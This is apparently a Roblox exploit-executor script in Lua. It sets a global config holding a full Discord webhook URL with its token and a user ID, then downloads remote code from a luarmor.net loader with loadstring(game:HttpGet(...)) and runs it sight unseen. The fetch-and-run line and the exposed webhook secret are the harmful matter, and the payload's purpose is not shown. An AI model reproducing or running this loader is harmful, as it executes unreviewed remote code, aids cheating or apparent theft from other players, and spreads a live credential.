local player = game.Players.LocalPlayer
local remote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("World1Teleport")

if game.PlaceId == 8737899170 then
    getgenv().Config = {
    ["Webhook"] = "https://discord.com/api/webhooks/1298665576922611835/0NB09b3xtYgbFP7NL0Q_UhAs_H_6Uf9H7_LoaKHpq4vHxeOYkKBw0wTfmcAnCmLZbitd",
    ["UserID"] = "683695252481245216",
    }
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/0d7f3a5ec8122fd45e395c3a9d4bf7ae.lua"))()
else
    local result = remote:InvokeServer()
end
